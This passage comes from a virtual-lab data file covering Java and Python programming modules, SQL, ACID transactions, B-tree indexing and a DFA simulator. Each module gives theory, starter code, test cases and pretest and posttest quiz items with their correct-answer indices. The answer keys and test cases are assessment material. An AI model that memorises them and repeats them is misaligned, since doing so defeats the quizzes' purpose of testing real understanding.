            "defaultCode": "import java.util.ArrayList;\nimport java.util.Scanner;\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        if (sc.hasNextInt()) {\n            int n = sc.nextInt();\n            ArrayList<Integer> list = new ArrayList<>();\n            for (int i = 0; i < n; i++) list.add(sc.nextInt());\n            for (int x : list) System.out.print(x + \" \");\n            System.out.println();\n        }\n    }\n}",
            "testCases": [
                {
                    "input": "3 5 10 15",
                    "expected": "5 10 15 "
                }
            ],
            "practice_commands": [
                "javac Main.java"
            ],
            "practice_questions": [
                "Explain static array vs ArrayList in Java."
            ]
        },
        {
            "title": "Module 4: Inheritance & Polymorphism",
            "aim": "To demonstrate inheritance using class extensions and overridden methods.",
            "theory": {
                "intro": "Classes extend base templates using 'extends' keyword. Overridden methods are dispatched dynamically at runtime.",
                "cards": [
                    {
                        "title": "Super links",
                        "content": "Use super() call to execute base class constructors. Override methods with @Override tag."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which keyword is used to inherit a class in Java?",
                    "options": [
                        "implements",
                        "extends",
                        "inherits",
                        "extends public"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Declare Animal base class and Dog derived class.",
                "2. Override sound() method.",
                "3. Invoke Sound on subclass instance."
            ],
            "posttest": [
                {
                    "q": "Method overloading represents which polymorphism form?",
                    "options": [
                        "Runtime",
                        "Compile time",
                        "Dynamic",
                        "Abstract"
                    ],
                    "correct": 1
                }
            ],
            "lang": "java",
            "version": "17",
            "defaultCode": "class Animal {\n    void sound() { System.out.println(\"Sound\"); }\n}\nclass Dog extends Animal {\n    @Override\n    void sound() { System.out.println(\"Bark\"); }\n}\npublic class Main {\n    public static void main(String[] args) {\n        Animal a = new Dog();\n        a.sound();\n    }\n}",
            "testCases": [
                {
                    "input": "",
                    "expected": "Bark"
                }
            ],
            "practice_commands": [
                "javac Main.java"
            ],
            "practice_questions": [
                "Explain dynamic method binding in Java."
            ]
        },
        {
            "title": "Module 5: Interfaces & Abstract Classes",
            "aim": "To design abstract specifications and implement multiple interfaces.",
            "theory": {
                "intro": "Abstract classes cannot be instantiated and can contain concrete methods. Interfaces contain purely abstract method templates (until Java 8).",
                "cards": [
                    {
                        "title": "Multiple Interfaces",
                        "content": "Classes can implement multiple interfaces, simulating multiple inheritance: class C implements A, B."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which keyword attaches an interface to a class?",
                    "options": [
                        "extends",
                        "implements",
                        "import",
                        "abstract"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Declare interface Run.",
                "2. Implement interface in class.",
                "3. Invoke run method."
            ],
            "posttest": [
                {
                    "q": "Can a Java class extend multiple abstract classes?",
                    "options": [
                        "Yes",
                        "No",
                        "Only if methods are public",
                        "Only in package scope"
                    ],
                    "correct": 1
                }
            ],
            "lang": "java",
            "version": "17",
            "defaultCode": "interface RunnableTask {\n    void runTask();\n}\nclass Task implements RunnableTask {\n    public void runTask() { System.out.println(\"Running\"); }\n}\npublic class Main {\n    public static void main(String[] args) {\n        RunnableTask r = new Task();\n        r.runTask();\n    }\n}",
            "testCases": [
                {
                    "input": "",
                    "expected": "Running"
                }
            ],
            "practice_commands": [
                "javac Main.java"
            ],
            "practice_questions": [
                "Compare abstract class vs interface in Java."
            ]
        },
        {
            "title": "Module 6: Exception Handling",
            "aim": "To intercept division runtime errors using try-catch blocks.",
            "theory": {
                "intro": "Checked exceptions are verified at compile time; Unchecked exceptions occur during runtime. Both are caught using try-catch blocks.",
                "cards": [
                    {
                        "title": "Checked vs Unchecked",
                        "content": "Wrap divisions in try blocks. Catch ArithmeticException if denominator is zero."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which block always executes after try-catch, regardless of exception status?",
                    "options": [
                        "finally",
                        "catch",
                        "throw",
                        "finish"
                    ],
                    "correct": 0
                }
            ],
            "procedure": [
                "1. Read inputs.",
                "2. Execute division inside try block.",
                "3. Print exception in catch block if division by zero occurs."
            ],
            "posttest": [
                {
                    "q": "Which class is the root class of all Java errors and exceptions?",
                    "options": [
                        "Exception",
                        "Throwable",
                        "RuntimeException",
                        "Error"
                    ],
                    "correct": 1
                }
            ],
            "lang": "java",
            "version": "17",
            "defaultCode": "import java.util.Scanner;\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        if (sc.hasNextInt()) {\n            int b = sc.nextInt();\n            try {\n                System.out.println(100 / b);\n            } catch (ArithmeticException e) {\n                System.out.println(\"Zero Error\");\n            }\n        }\n    }\n}",
            "testCases": [
                {
                    "input": "0",
                    "expected": "Zero Error"
                },
                {
                    "input": "20",
                    "expected": "5"
                }
            ],
            "practice_commands": [
                "javac Main.java"
            ],
            "practice_questions": [
                "Explain Checked vs Unchecked exceptions in Java."
            ]
        },
        {
            "title": "Module 7: String Manipulation",
            "aim": "To demonstrate string comparison and immutability concepts.",
            "theory": {
                "intro": "Java strings are immutable objects stored in the String Pool. Use StringBuilder for efficient string concatenation.",
                "cards": [
                    {
                        "title": "String Pool",
                        "content": "Strings created with literals are reuse-shared. Immutable designs guarantee thread safety."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which method compares Java string values for equality?",
                    "options": [
                        "==",
                        "equals()",
                        "compare()",
                        "match()"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read string.",
                "2. Reverse using StringBuilder.",
                "3. Compare and print Palindrome status."
            ],
            "posttest": [
                {
                    "q": "Why are Java Strings immutable?",
                    "options": [
                        "For security and caching in the string pool",
                        "They are primitive types",
                        "To speed up compilation",
                        "To reduce RAM usage by 90%"
                    ],
                    "correct": 0
                }
            ],
            "lang": "java",
            "version": "17",
            "defaultCode": "import java.util.Scanner;\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        if (sc.hasNext()) {\n            String s = sc.next();\n            String rev = new StringBuilder(s).reverse().toString();\n            if (s.equals(rev)) System.out.println(\"Palindrome\");\n            else System.out.println(\"Not Palindrome\");\n        }\n    }\n}",
            "testCases": [
                {
                    "input": "level",
                    "expected": "Palindrome"
                }
            ],
            "practice_commands": [
                "javac Main.java"
            ],
            "practice_questions": [
                "Compare String vs StringBuilder vs StringBuffer."
            ]
        },
        {
            "title": "Module 8: Collections Framework",
            "aim": "To store key-value matches using HashMap collections.",
            "theory": {
                "intro": "The Collections framework provides data structures like List (ArrayList), Set (HashSet), and Map (HashMap).",
                "cards": [
                    {
                        "title": "Map Storage",
                        "content": "HashMap matches keys to values in O(1) average lookup complexity: Map<String, Integer> map = new HashMap<>();"
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which interface represents key-value mapping in Java?",
                    "options": [
                        "List",
                        "Set",
                        "Map",
                        "Collection"
                    ],
                    "correct": 2
                }
            ],
            "procedure": [
                "1. Store mock student grades in HashMap.",
                "2. Read name key.",
                "3. Retrieve and print score."
            ],
            "posttest": [
                {
                    "q": "HashMap handles key hash collisions using which data structures?",
                    "options": [
                        "LinkedList and red-black Tree",
                        "Stack",
                        "Queue",
                        "Heap"
                    ],
                    "correct": 0
                }
            ],
            "lang": "java",
            "version": "17",
            "defaultCode": "import java.util.HashMap;\nimport java.util.Scanner;\npublic class Main {\n    public static void main(String[] args) {\n        HashMap<String, Integer> map = new HashMap<>();\n        map.put(\"Alice\", 90);\n        map.put(\"Bob\", 80);\n        Scanner sc = new Scanner(System.in);\n        if (sc.hasNext()) {\n            String key = sc.next();\n            System.out.println(map.getOrDefault(key, 0));\n        }\n    }\n}",
            "testCases": [
                {
                    "input": "Alice",
                    "expected": "90"
                }
            ],
            "practice_commands": [
                "javac Main.java"
            ],
            "practice_questions": [
                "Compare HashMap vs TreeMap in Java."
            ]
        },
        {
            "title": "Module 9: Multithreading",
            "aim": "To spawn concurrent threads using the Runnable interface.",
            "theory": {
                "intro": "Multithreading executes tasks concurrently. Create threads by extending Thread class or implementing Runnable interface.",
                "cards": [
                    {
                        "title": "Threads",
                        "content": "Implement runnable, start thread: new Thread(runnable).start(). Never call run() directly."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which method starts a Java thread's execution?",
                    "options": [
                        "run()",
                        "start()",
                        "execute()",
                        "init()"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Instantiate Runnable task.",
                "2. Start thread execution.",
                "3. Log child thread confirmation message."
            ],
            "posttest": [
                {
                    "q": "Calling run() directly instead of start() does what?",
                    "options": [
                        "Spawns a thread",
                        "Executes run method synchronously in current thread",
                        "Compiler error",
                        "Throws exception"
                    ],
                    "correct": 1
                }
            ],
            "lang": "java",
            "version": "17",
            "defaultCode": "public class Main {\n    public static void main(String[] args) {\n        Thread t = new Thread(() -> System.out.println(\"Thread Running\"));\n        t.start();\n    }\n}",
            "testCases": [
                {
                    "input": "",
                    "expected": "Thread Running"
                }
            ],
            "practice_commands": [
                "javac Main.java"
            ],
            "practice_questions": [
                "Explain thread synchronization and race conditions."
            ]
        },
        {
            "title": "Module 10: Generics & Lambda",
            "aim": "To implement functional interfaces and lambda expressions.",
            "theory": {
                "intro": "Generics enable class types to accept parameters. Lambda expressions provide implementation templates for Functional Interfaces.",
                "cards": [
                    {
                        "title": "Lambdas",
                        "content": "Pass functions as parameters: NumericOperator op = (x, y) -> x + y;."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "What is a functional interface?",
                    "options": [
                        "Interface with zero methods",
                        "Interface with exactly one abstract method",
                        "Interface with only static methods",
                        "Interface with generic types"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read inputs.",
                "2. Execute lambda mathematical evaluation.",
                "3. Print outputs."
            ],
            "posttest": [
                {
                    "q": "Which symbol represents Java lambda expressions?",
                    "options": [
                        "->",
                        "=>",
                        "::",
                        "::lambda"
                    ],
                    "correct": 0
                }
            ],
            "lang": "java",
            "version": "17",
            "defaultCode": "import java.util.Scanner;\ninterface MathOp {\n    int operate(int a, int b);\n}\npublic class Main {\n    public static void main(String[] args) {\n        MathOp add = (x, y) -> x + y;\n        Scanner sc = new Scanner(System.in);\n        if (sc.hasNextInt()) {\n            int a = sc.nextInt();\n            int b = sc.nextInt();\n            System.out.println(add.operate(a, b));\n        }\n    }\n}",
            "testCases": [
                {
                    "input": "50 50",
                    "expected": "100"
                }
            ],
            "practice_commands": [
                "javac Main.java"
            ],
            "practice_questions": [
                "What is the double colon (::) operator in Java 8?"
            ]
        }
    ]
};

window.VLAB_DATA.python_prog = {
    "title": "Python Scripting Lab",
    "simType": "programming",
    "isMultiModule": true,
    "modules": [
        {
            "title": "Module 1: Dynamic Typing",
            "aim": "To demonstrate dynamic variables and standard formatting using f-strings.",
            "theory": {
                "intro": "Python variables do not require static type declarations. Types are resolved dynamically at runtime.",
                "cards": [
                    {
                        "title": "F-Strings",
                        "content": "Format outputs cleanly: print(f'Sum: {a + b}'). input() returns string data."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "What does input() return in Python?",
                    "options": [
                        "int",
                        "float",
                        "str",
                        "list"
                    ],
                    "correct": 2
                }
            ],
            "procedure": [
                "1. Read string values.",
                "2. Cast to int dynamically.",
                "3. Print sum using f-string."
            ],
            "posttest": [
                {
                    "q": "How do you check a variable's type in Python?",
                    "options": [
                        "type()",
                        "typeof()",
                        "isinstance",
                        "class()"
                    ],
                    "correct": 0
                }
            ],
            "lang": "python",
            "version": "3.9",
            "defaultCode": "import sys\nline = sys.stdin.readline().strip()\nif line:\n    a, b = map(int, line.split())\n    print(f\"Sum: {a + b}\")",
            "testCases": [
                {
                    "input": "33 44",
                    "expected": "Sum: 77"
                }
            ],
            "practice_commands": [
                "python main.py"
            ],
            "practice_questions": [
                "Explain mutable vs immutable types in Python."
            ]
        },
        {
            "title": "Module 2: Control Flow",
            "aim": "To evaluate boundary parameters using if-elif-else statements.",
            "theory": {
                "intro": "Python checks conditional execution blocks using indentation instead of curly braces.",
                "cards": [
                    {
                        "title": "Indentation",
                        "content": "Indented whitespace separates code blocks. Consistently use 4 spaces."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which keyword represents ELSE IF in Python?",
                    "options": [
                        "elseif",
                        "else if",
                        "elif",
                        "otherwise"
                    ],
                    "correct": 2
                }
            ],
            "procedure": [
                "1. Read score integer.",
                "2. Compare grade thresholds.",
                "3. Print Grade letters."
            ],
            "posttest": [
                {
                    "q": "Which value is evaluated as False in Python boolean checks?",
                    "options": [
                        "1",
                        "True",
                        "None",
                        "'False'"
                    ],
                    "correct": 2
                }
            ],
            "lang": "python",
            "version": "3.9",
            "defaultCode": "import sys\nline = sys.stdin.readline().strip()\nif line:\n    score = int(line)\n    if score >= 80:\n        print(\"Grade A\")\n    elif score >= 60:\n        print(\"Grade B\")\n    else:\n        print(\"Grade F\")",
            "testCases": [
                {
                    "input": "75",
                    "expected": "Grade B"
                }
            ],
            "practice_commands": [
                "python main.py"
            ],
            "practice_questions": [
                "Explain ternary operators in Python."
            ]
        },
        {
            "title": "Module 3: Lists & Tuples",
            "aim": "To access sequences, indexing, and slice operations in Python lists and tuples.",
            "theory": {
                "intro": "Lists are mutable, dynamic arrays. Tuples are immutable fixed sequences. Both support negative indexing and slicing.",
                "cards": [
                    {
                        "title": "Slicing",
                        "content": "Reverse sequences using reverse slice: list[::-1]. Negative indexes count from the end."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which syntax represents a Tuple in Python?",
                    "options": [
                        "[]",
                        "()",
                        "{}",
                        "<>"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read input string.",
                "2. Verify palindrome status using list slice.",
                "3. Print 'Palindrome' or 'Not Palindrome'."
            ],
            "posttest": [
                {
                    "q": "What happens when we try to append elements to a Tuple?",
                    "options": [
                        "Sizes scale dynamically",
                        "Throws TypeError",
                        "Appends normally",
                        "Compiler warning"
                    ],
                    "correct": 1
                }
            ],
            "lang": "python",
            "version": "3.9",
            "defaultCode": "import sys\ns = sys.stdin.readline().strip()\nif s:\n    if s == s[::-1]:\n        print(\"Palindrome\")\n    else:\n        print(\"Not Palindrome\")",
            "testCases": [
                {
                    "input": "racecar",
                    "expected": "Palindrome"
                }
            ],
            "practice_commands": [
                "python main.py"
            ],
            "practice_questions": [
                "Compare list vs tuple in Python."
            ]
        },
        {
            "title": "Module 4: Dictionaries & Sets",
            "aim": "To retrieve values matching key indexes using dict and set objects.",
            "theory": {
                "intro": "Dictionaries store key-value pairs (hash maps). Sets store unique, unordered elements.",
                "cards": [
                    {
                        "title": "Uniqueness",
                        "content": "Sets filter duplicates: set([1, 2, 2]) = {1, 2}. Dict retrieves keys in O(1) average time."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which class represents key-value storage in Python?",
                    "options": [
                        "list",
                        "tuple",
                        "dict",
                        "set"
                    ],
                    "correct": 2
                }
            ],
            "procedure": [
                "1. Read key name.",
                "2. Look up in grade dictionary.",
                "3. Print score value."
            ],
            "posttest": [
                {
                    "q": "What is the result of set([1, 2, 2])?",
                    "options": [
                        "{1, 2, 2}",
                        "{1, 2}",
                        "[1, 2, 2]",
                        "Error"
                    ],
                    "correct": 1
                }
            ],
            "lang": "python",
            "version": "3.9",
            "defaultCode": "import sys\nline = sys.stdin.readline().strip()\nif line:\n    grades = {\"Alice\": 95, \"Bob\": 85}\n    print(grades.get(line, 0))",
            "testCases": [
                {
                    "input": "Alice",
                    "expected": "95"
                }
            ],
            "practice_commands": [
                "python main.py"
            ],
            "practice_questions": [
                "How are dictionary key collisions handled in Python?"
            ]
        },
        {
            "title": "Module 5: Functions (*args, **kwargs)",
            "aim": "To accept variable positional and keyword arguments in Python functions.",
            "theory": {
                "intro": "Functions accept dynamic arguments: *args packs positional arguments as a tuple; **kwargs packs keyword arguments as a dictionary.",
                "cards": [
                    {
                        "title": "Dynamic Args",
                        "content": "def show(*args, **kwargs): passes variable arguments dynamically."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "What type does *args pack arguments into?",
                    "options": [
                        "list",
                        "tuple",
                        "dict",
                        "set"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read numbers.",
                "2. Pass to a sum function using *args.",
                "3. Print sum."
            ],
            "posttest": [
                {
                    "q": "What type does **kwargs pack keyword arguments into?",
                    "options": [
                        "list",
                        "tuple",
                        "dict",
                        "set"
                    ],
                    "correct": 2
                }
            ],
            "lang": "python",
            "version": "3.9",
            "defaultCode": "import sys\ndef sum_all(*args):\n    return sum(args)\nline = sys.stdin.readline().strip()\nif line:\n    nums = list(map(int, line.split()))\n    print(sum_all(*nums))",
            "testCases": [
                {
                    "input": "10 20 30",
                    "expected": "60"
                }
            ],
            "practice_commands": [
                "python main.py"
            ],
            "practice_questions": [
                "Explain positional-only vs keyword-only arguments in Python."
            ]
        },
        {
            "title": "Module 6: OOP",
            "aim": "To define classes, constructors (__init__), and methods in Python.",
            "theory": {
                "intro": "Object-oriented structures model entities. Python uses __init__(self) to define constructors and passes the 'self' parameter to refer to the active object instance.",
                "cards": [
                    {
                        "title": "Self parameter",
                        "content": "Every instance method must accept 'self' as its first parameter to bind class scope."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which method acts as the constructor in Python classes?",
                    "options": [
                        "__init__",
                        "constructor",
                        "new",
                        "main"
                    ],
                    "correct": 0
                }
            ],
            "procedure": [
                "1. Declare Student class.",
                "2. Read parameters.",
                "3. Instantiate and print record."
            ],
            "posttest": [
                {
                    "q": "How does Python represent private attributes inside classes?",
                    "options": [
                        "private keyword",
                        "Using double leading underscores (e.g. __name)",
                        "Using const modifier",
                        "Protected tag"
                    ],
                    "correct": 1
                }
            ],
            "lang": "python",
            "version": "3.9",
            "defaultCode": "import sys\nclass Student:\n    def __init__(self, name):\n        self.name = name\n    def show(self):\n        print(f\"Student: {self.name}\")\nline = sys.stdin.readline().strip()\nif line:\n    s = Student(line)\n    s.show()",
            "testCases": [
                {
                    "input": "David",
                    "expected": "Student: David"
                }
            ],
            "practice_commands": [
                "python main.py"
            ],
            "practice_questions": [
                "Explain double underscore attribute name mangling in Python."
            ]
        },
        {
            "title": "Module 7: File Handling & JSON",
            "aim": "To write structured logs using 'with' file blocks and serialize JSON files.",
            "theory": {
                "intro": "The 'with' statement manages file scopes, closing files automatically. The 'json' module serializes dictionaries to string formats.",
                "cards": [
                    {
                        "title": "Json handling",
                        "content": "Serialize dicts: json.dumps(data). Write using with open('log.json', 'w') as f:."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which statement opens files safely in Python ensuring auto-close?",
                    "options": [
                        "open",
                        "with open",
                        "file_open",
                        "try-open"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read inputs.",
                "2. Mock write to file log.",
                "3. Return verification log."
            ],
            "posttest": [
                {
                    "q": "Which function converts a Python dictionary to a JSON string?",
                    "options": [
                        "json.load()",
                        "json.dump()",
                        "json.dumps()",
                        "json.stringify()"
                    ],
                    "correct": 2
                }
            ],
            "lang": "python",
            "version": "3.9",
            "defaultCode": "import sys, json\nline = sys.stdin.readline().strip()\nif line:\n    data = {\"log\": line}\n    print(json.dumps(data))",
            "testCases": [
                {
                    "input": "LogEntry",
                    "expected": "{\"log\": \"LogEntry\"}"
                }
            ],
            "practice_commands": [
                "python main.py"
            ],
            "practice_questions": [
                "Explain the difference between json.dump() and json.dumps()."
            ]
        },
        {
            "title": "Module 8: Exception Handling",
            "aim": "To intercept division errors using try-except-finally blocks.",
            "theory": {
                "intro": "Python handles runtime errors inside try blocks, executing rescue statements inside except blocks and final cleanups in finally blocks.",
                "cards": [
                    {
                        "title": "Finally blocks",
                        "content": "The finally block always runs, ensuring critical resources like DB connections are released."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which block catches exceptions in Python?",
                    "options": [
                        "catch",
                        "except",
                        "try",
                        "error"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read denominator.",
                "2. Execute division inside try block.",
                "3. Catch ZeroDivisionError and print alert message."
            ],
            "posttest": [
                {
                    "q": "Which keyword manually raises an exception in Python?",
                    "options": [
                        "throw",
                        "raise",
                        "error",
                        "except"
                    ],
                    "correct": 1
                }
            ],
            "lang": "python",
            "version": "3.9",
            "defaultCode": "import sys\nline = sys.stdin.readline().strip()\nif line:\n    b = int(line)\n    try:\n        print(100 // b)\n    except ZeroDivisionError:\n        print(\"Zero Error\")",
            "testCases": [
                {
                    "input": "0",
                    "expected": "Zero Error"
                },
                {
                    "input": "25",
                    "expected": "4"
                }
            ],
            "practice_commands": [
                "python main.py"
            ],
            "practice_questions": [
                "Explain try-except-else-finally blocks in Python."
            ]
        },
        {
            "title": "Module 9: List Comprehensions & Generators",
            "aim": "To create inline arrays using list comprehensions and yield values from Generators.",
            "theory": {
                "intro": "List comprehensions offer concise loop array builds: [x*2 for x in list]. Generators return lazy iteration streams using the 'yield' keyword.",
                "cards": [
                    {
                        "title": "Generators",
                        "content": "Generators return memory-efficient iterators using 'yield', resuming state on next() calls."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which keyword transforms a Python function into a Generator?",
                    "options": [
                        "return",
                        "yield",
                        "generator",
                        "lazy"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read integers.",
                "2. Use list comprehension to filter even elements.",
                "3. Print elements."
            ],
            "posttest": [
                {
                    "q": "Which container syntax represents list comprehensions?",
                    "options": [
                        "()",
                        "[]",
                        "{}",
                        "<>"
                    ],
                    "correct": 1
                }
            ],
            "lang": "python",
            "version": "3.9",
            "defaultCode": "import sys\nline = sys.stdin.readline().strip()\nif line:\n    nums = list(map(int, line.split()))\n    evens = [x for x in nums if x % 2 == 0]\n    print(evens)",
            "testCases": [
                {
                    "input": "1 2 3 4 5 6",
                    "expected": "[2, 4, 6]"
                }
            ],
            "practice_commands": [
                "python main.py"
            ],
            "practice_questions": [
                "Compare list comprehension vs generators memory footprint."
            ]
        },
        {
            "title": "Module 10: Modules & Standard Library",
            "aim": "To import utilities from the standard library (math, random).",
            "theory": {
                "intro": "The standard library packages utilities into modules. Use the 'import' keyword to load modules like math or datetime.",
                "cards": [
                    {
                        "title": "Math library",
                        "content": "Calculate roots: math.sqrt(x). Generate random integers: random.randint(a, b)."
                    }
                ]
            },
            "pretest": [
                {
                    "q": "Which keyword imports standard modules in Python?",
                    "options": [
                        "load",
                        "import",
                        "include",
                        "require"
                    ],
                    "correct": 1
                }
            ],
            "procedure": [
                "1. Read float value.",
                "2. Use math.sqrt() to calculate square root.",
                "3. Print rounded result."
            ],
            "posttest": [
                {
                    "q": "What does the from...import syntax do?",
                    "options": [
                        "Imports the entire module",
                        "Imports specific objects/functions directly into the local namespace",
                        "Excludes parts of a module",
                        "Runs the module in background"
                    ],
                    "correct": 1
                }
            ],
            "lang": "python",
            "version": "3.9",
            "defaultCode": "import sys, math\nline = sys.stdin.readline().strip()\nif line:\n    x = float(line)\n    print(round(math.sqrt(x), 2))",
            "testCases": [
                {
                    "input": "25",
                    "expected": "5.0"
                },
                {
                    "input": "2",
                    "expected": "1.41"
                }
            ],
            "practice_commands": [
                "python main.py"
            ],
            "practice_questions": [
                "Explain PYTHONPATH and package structure in Python."
            ]
        }
    ]
};

window.VLAB_DATA.sql_queries = {
    "title": "Relational Schemas & SQL Queries",
    "aim": "To write structured database queries using SELECT, JOIN, GROUP BY, and HAVING to fetch data from relational schemas.",
    "theory": {
        "intro": "Structured Query Language (SQL) is the standard language to manage and query relational databases.",
        "cards": [
            {
                "title": "1. Relational Joins",
                "content": "Combines records from two tables using a common attribute. INNER JOIN, LEFT JOIN, and RIGHT JOIN specify selection boundaries."
            },
            {
                "title": "2. Aggregations",
                "content": "Using functions like SUM, COUNT, AVG along with GROUP BY to group records and HAVING to filter aggregated results."
            }
        ]
    },
    "pretest": [
        {
            "q": "Which clause is used to filter aggregated data?",
            "options": [
                "WHERE",
                "HAVING",
                "GROUP BY",
                "ORDER BY"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Review the relational database schema diagram on the screen.",
        "2. Construct a SELECT query in the SQL editor.",
        "3. Click 'Run SQL' to execute the query against the relational database mock.",
        "4. View the matching rows printed in the table output."
    ],
    "posttest": [
        {
            "q": "What is a Primary Key?",
            "options": [
                "A key that allows duplicates",
                "A unique identifier for each record in a table",
                "An index helper only",
                "A foreign connector"
            ],
            "correct": 1
        }
    ],
    "simType": "dbms_sql",
    "practice_commands": [
        "SELECT * FROM Students;",
        "SELECT name, course FROM Students JOIN Enrollments ON Students.id = Enrollments.student_id;"
    ],
    "practice_questions": [
        "What is the difference between WHERE and HAVING?",
        "Explain 1NF, 2NF, and 3NF normalization rules."
    ]
};

window.VLAB_DATA.transactions = {
    "title": "Database Transactions & ACID Properties",
    "aim": "To simulate database transactions to examine concurrency control, rollback operations, and commit points that guarantee ACID properties.",
    "theory": {
        "intro": "A database transaction is a unit of work performed against a database. ACID properties ensure database reliability and consistency during transactions.",
        "cards": [
            {
                "title": "1. Atomicity",
                "content": "Guarantees that all operations in a transaction are completed successfully, or the entire transaction is rolled back (All-or-Nothing)."
            },
            {
                "title": "2. Concurrency Isolation",
                "content": "Ensures that concurrent execution of transactions leaves the database in the same state as if they were executed sequentially."
            }
        ]
    },
    "pretest": [
        {
            "q": "What does the 'A' in ACID stand for?",
            "options": [
                "Authorization",
                "Atomicity",
                "Algorithm",
                "Architecture"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Set transaction bounds by clicking BEGIN TRANSACTION.",
        "2. Execute update statements (e.g. transfer money).",
        "3. Check the intermediate dirty states of the tables.",
        "4. Perform COMMIT to save permanently or ROLLBACK to discard modifications."
    ],
    "posttest": [
        {
            "q": "Which command is used to undo transaction changes?",
            "options": [
                "COMMIT",
                "SAVEPOINT",
                "ROLLBACK",
                "DELETE"
            ],
            "correct": 2
        }
    ],
    "simType": "dbms_transactions",
    "practice_commands": [
        "BEGIN TRANSACTION;",
        "UPDATE Accounts SET balance = balance - 100 WHERE id = 1;",
        "COMMIT;",
        "ROLLBACK;"
    ],
    "practice_questions": [
        "Explain Dirty Read and Non-Repeatable Read.",
        "What are shared and exclusive locks?"
    ]
};

window.VLAB_DATA.indexing = {
    "title": "Database Indexing Structures (B-Trees)",
    "aim": "To analyze search complexity in relational tables and visualize B-Tree indexing structures during dynamic insertions.",
    "theory": {
        "intro": "Indexing speeds up database search operations by creating pointers to data blocks, commonly modeled using balanced B-Tree or B+ Tree structures.",
        "cards": [
            {
                "title": "1. B-Tree Structure",
                "content": "A self-balancing search tree where each node contains multiple keys and children pointers. Keeps data sorted and allows search, sequential access, insertions, and deletions in logarithmic time."
            },
            {
                "title": "2. Node Splits",
                "content": "When a node exceeds its key capacity limit (order M), it splits into two nodes, promoting the median key to the parent node. This maintains balance."
            }
        ]
    },
    "pretest": [
        {
            "q": "What is the primary benefit of creating a database index?",
            "options": [
                "Increases storage space",
                "Speeds up data retrieval queries",
                "Ensures data encryption",
                "Prevents database crashes"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Enter integer keys to insert into the B-Tree structure.",
        "2. Observe how the tree balances itself and splits nodes when capacity is exceeded.",
        "3. Verify how search operations traverse the tree in O(log N) operations."
    ],
    "posttest": [
        {
            "q": "In a B-Tree of order 3, what is the maximum number of keys in a node?",
            "options": [
                "1",
                "2",
                "3",
                "4"
            ],
            "correct": 1
        }
    ],
    "simType": "dbms_indexing",
    "practice_commands": [
        "CREATE INDEX idx_student_name ON Students(name);",
        "DROP INDEX idx_student_name;"
    ],
    "practice_questions": [
        "Why is a B+ Tree preferred over a B-Tree for relational indexing?",
        "What is a clustered index?"
    ]
};

window.VLAB_DATA.dfa_sim = {
    "title": "Deterministic Finite Automata (DFA) Simulator",
    "aim": "To design and simulate a Deterministic Finite Automata (DFA) that accepts binary strings containing the substring '01', visualizing state transitions dynamically.",
    "theory": {
        "intro": "A Deterministic Finite Automaton (DFA) is a 5-tuple $(Q, \\Sigma, \\delta, q_0, F)$ consisting of a finite set of states, a finite set of input symbols, a transition function, a start state, and a set of accept states. Deterministic means that for each state and input symbol, there is exactly one transition to a next state.",
        "cards": [
            {
                "title": "1. The 5-Tuple Definition",
                "content": "• $Q$: Finite set of states, e.g. $\\{q_0, q_1, q_2\\}$.\n• $\\Sigma$: Input alphabet, e.g. $\\{0, 1\\}$.\n• $\\delta$: Transition function $\\delta : Q \\times \\Sigma \\to Q$.\n• $q_0$: Initial state ($q_0 \\in Q$).\n• $F$: Set of accepting/final states ($F \\subseteq Q$)."
            },
            {
                "title": "2. The Target Language",
                "content": "We model a language $L = \\{w \\in \\{0,1\\}^* \\mid w \\text{ contains substring } 01\\}$. State transitions:\n• $q_0$: Initial state (no '0' seen yet).\n• $q_1$: State representing that '0' was just seen (waiting for '1').\n• $q_2$: Accepting state (substring '01' has been successfully matched)."
            }
        ]
    },
    "pretest": [
        {
            "q": "A Deterministic Finite Automaton (DFA) is defined as how many tuples?",
            "options": [
                "3",
                "4",
                "5",
                "6"
            ],
            "correct": 2
        },
        {
            "q": "What does 'deterministic' mean in a DFA?",
            "options": [
                "Multiple transitions are allowed for a single input symbol",
                "Exactly one transition exists from each state for any input symbol",
                "No transitions are allowed",
                "Transitions are randomized"
            ],
            "correct": 1
        },
        {
            "q": "For a DFA to accept a string, the traversal must end in:",
            "options": [
                "The start state",
                "Any state in Q",
                "An accepting/final state F",
                "A trap/dead state"
            ],
            "correct": 2
        }
    ],
    "procedure": [
        "1. In the simulation workspace, enter a binary input string (composed of 0s and 1s, e.g. 10101).",
        "2. Click 'Reset' to place the DFA in its initial state P0 (q0).",
        "3. Click 'Next Step' to feed the first input character into the automaton.",
        "4. Observe which active state circle is highlighted in the graph and read the transition rule log.",
